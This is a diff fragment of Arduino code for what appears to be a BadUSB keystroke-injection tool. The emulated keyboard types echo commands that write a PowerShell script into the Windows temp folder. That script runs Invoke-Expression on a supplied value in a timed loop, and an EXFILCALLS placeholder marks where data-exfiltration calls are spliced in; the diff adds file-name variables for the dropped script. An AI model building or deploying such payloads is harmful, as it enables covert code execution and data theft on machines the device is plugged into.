@@ -56,7 +56,8 @@ void setup(){
   Keyboard.println("echo if ($fname -ne $null) {$pv = Invoke-Expression $fname} >> %temp%\\dtb.ps1");
   Keyboard.println("echo $exec++ } >> %temp%\\dtb.ps1");
   Keyboard.println("echo if ($exec -eq 1){ >> %temp%\\dtb.ps1");
-
+  String fn = "dtb";
+  String fp;
   EXFILCALLS
 
   Keyboard.println("echo sleep 60 }  >> %temp%\\dtb.ps1");
